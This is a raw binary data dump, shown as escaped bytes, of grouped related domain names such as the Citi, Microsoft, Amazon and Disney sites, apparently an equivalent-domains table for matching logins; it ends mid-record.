0\x03\x00\xff\xff\x16\x00\x00\x80\x04\x00\xff\xffwellsfargoadvisors.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x06\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffmymerrill.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffml.com\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffmerrilledge.com\x00\x00\x00\x00\x00\x13\x00\xff\xff\x07\x00\x00\x00\x03\x00\xff\xff\x05\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x11\x00\x00\x80\x04\x00\xff\xffaccountonline.com\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffciti.com\x02\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffcitibank.com\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffciticards.com\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffcitibankonline.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x08\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffcnet.com\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffcnettv.com\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffcom.com\x00\x03\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffdownload.com\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffnews.com\x05\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffsearch.com\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffupload.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\t\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffbananarepublic.com\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffgap.com\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffoldnavy.com\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffpiperlime.com\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\n\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffbing.com\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffhotmail.com\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xfflive.com\x03\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffmicrosoft.com\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffmsn.com\x00\x05\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffpassport.net\x00\x00\x00\x00\x06\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffwindows.com\x00\x00\x00\x00\x00\x07\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xffmicrosoftonline.com\x00\x00\x00\x00\x00\x08\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffoffice.com\x00\x00\x00\x00\x00\x00\t\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffoffice365.com\x00\x00\x00\n\x00\x00\x00\x03\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffmicrosoftstore.com\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffxbox.com\x0c\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffazure.com\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffwindowsazure.com\x00\x00\x00\x00\x13\x00\xff\xff\x0b\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffua2go.com\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffual.com\x00\x02\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffunited.com\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffunitedwifi.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x0c\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffoverture.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffyahoo.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\r\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffzonealarm.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffzonelabs.com\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x0e\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffpaypal.com\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x11\x00\x00\x80\x04\x00\xff\xffpaypal-search.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x0f\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffavon.com\x01\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffyouravon.com\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x10\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffdiapers.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffsoap.com\x02\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffwag.com\x00\x03\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffyoyo.com\x04\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffbeautybar.com\x00\x00\x00\x05\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffcasa.com\x06\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffafterschool.com\x00\x07\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffvine.com\x08\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffbookworm.com\x00\x00\x00\x00\t\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xfflook.com\n\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffvinemarket.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x11\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xff1800contacts.com\x01\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xff800contacts.com\x00\x00\x00\x00\x00\x13\x00\xff\xff\x12\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffamazon.com\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffamazon.com.be\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.ae\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.ca\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffamazon.co.uk\x00\x00\x00\x00\x05\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffamazon.com.au\x00\x00\x00\x06\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffamazon.com.br\x00\x00\x00\x07\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffamazon.com.mx\x00\x00\x00\x08\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffamazon.com.tr\x00\x00\x00\t\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.de\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.es\x00\x00\x00\x00\x00\x00\x00\x0b\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.fr\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.in\x00\x00\x00\x00\x00\x00\x00\r\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.it\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.nl\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.pl\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.sa\x00\x00\x00\x00\x00\x00\x00\x11\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.se\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffamazon.sg\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x13\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffcox.com\x00\x01\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffcox.net\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffcoxbusiness.com\x00\x00\x00\x00\x00\x13\x00\xff\xff\x14\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xffmynortonaccount.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffnorton.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x15\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffverizon.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffverizon.net\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x16\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffrakuten.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffbuy.com\x00\x00\x00\x00\x00\x13\x00\xff\xff\x17\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffsiriusxm.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffsirius.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x18\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffea.com\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xfforigin.com\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffplay4free.com\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\x14\x00\x00\x80\x04\x00\xff\xfftiberiumalliance.com\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x19\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xff37signals.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffbasecamp.com\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffbasecamphq.com\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffhighrisehq.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x1a\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffsteampowered.com\x01\x00\x00\x00\x03\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffsteamcommunity.com\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffsteamgames.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x1b\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffchart.io\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffchartio.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x1c\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffgotomeeting.com\x00\x01\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffcitrixonline.com\x00\x00\x00\x00\x13\x00\xff\xff\x1d\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffgogoair.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffgogoinflight.com\x00\x00\x00\x00\x13\x00\xff\xff\x1e\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffmysql.com\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xfforacle.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff\x1f\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffdiscover.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffdiscovercard.com\x00\x00\x00\x00\x13\x00\xff\xff \x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffdcu.org\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffdcu-online.org\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff!\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffhealthcare.gov\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffcuidadodesalud.gov\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffcms.gov\x00\x00\x00\x00\x00\x13\x00\xff\xff"\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffpepco.com\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x11\x00\x00\x80\x04\x00\xff\xffpepcoholdings.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff#\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffcentury21.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xff21online.com\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff$\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffcomcast.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffcomcast.net\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffxfinity.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff%\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xffcricketwireless.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffaiowireless.com\x00\x00\x00\x00\x00\x13\x00\xff\xff&\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffmandtbank.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x80\x04\x00\xff\xffmtb.com\x00\x00\x00\x00\x00\x13\x00\xff\xff\'\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffdropbox.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffgetdropbox.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff(\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffsnapfish.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffsnapfish.ca\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff)\x00\x00\x00\x03\x00\xff\xff\x04\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffalibaba.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffaliexpress.com\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffaliyun.com\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffnet.cn\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff*\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffplaystation.com\x00\x01\x00\x00\x00\x03\x00\xff\xff\x1c\x00\x00\x80\x04\x00\xff\xffsonyentertainmentnetwork.com\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff+\x00\x00\x00\x03\x00\xff\xff\x05\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffmercadolivre.com\x01\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xffmercadolivre.com.br\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffmercadolibre.com\x03\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xffmercadolibre.com.ar\x00\x00\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\x13\x00\x00\x80\x04\x00\xff\xffmercadolibre.com.mx\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff,\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffzendesk.com\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffzopim.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff-\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffautodesk.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xfftinkercad.com\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff.\x00\x00\x00\x03\x00\xff\xff\x07\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffrailnation.ru\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffrailnation.de\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0f\x00\x00\x80\x04\x00\xff\xffrail-nation.com\x00\x03\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffrailnation.gr\x00\x00\x00\x04\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffrailnation.us\x00\x00\x00\x05\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xfftrucknation.de\x00\x00\x06\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xfftraviangames.com\x00\x00\x00\x00\x13\x00\xff\xff/\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\t\x00\x00\x80\x04\x00\xff\xffwpcu.coop\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffwpcuonline.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff0\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffmathletics.com\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x11\x00\x00\x80\x04\x00\xff\xffmathletics.com.au\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x10\x00\x00\x80\x04\x00\xff\xffmathletics.co.uk\x00\x00\x00\x00\x13\x00\xff\xff1\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x12\x00\x00\x80\x04\x00\xff\xffdiscountbank.co.il\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xfftelebank.co.il\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff2\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffmi.com\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffxiaomi.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff3\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffpostepay.it\x00\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffposte.it\x00\x00\x00\x00\x13\x00\xff\xff4\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xfffacebook.com\x00\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffmessenger.com\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff5\x00\x00\x00\x03\x00\xff\xff\x03\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\r\x00\x00\x80\x04\x00\xff\xffskysports.com\x00\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffskybet.com\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\x0c\x00\x00\x80\x04\x00\xff\xffskyvegas.com\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff6\x00\x00\x00\x03\x00\xff\xff\x05\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x18\x00\x00\x80\x04\x00\xff\xffdisneymoviesanywhere.com\x01\x00\x00\x00\x03\x00\xff\xff\x06\x00\x00\x80\x04\x00\xff\xffgo.com\x00\x00\x02\x00\x00\x00\x03\x00\xff\xff\n\x00\x00\x80\x04\x00\xff\xffdisney.com\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x80\x04\x00\xff\xffdadt.com\x04\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffdisneyplus.com\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff7\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x0e\x00\x00\x80\x04\x00\xff\xffpokemon-gl.com\x00\x00\x01\x00\x00\x00\x03\x00\xff\xff\x0b\x00\x00\x80\x04\x00\xff\xffpokemon.com\x00\x00\x00\x00\x00\x00\x00\x00\x00\x13\x00\xff\xff8\x00\x00\x00\x03\x00\xff\xff\x02\x00\x00\x00\x07\x00\xff\xff\x00\x00\x00\x00\x03\x00\xff\xff\x08\x00\x00\x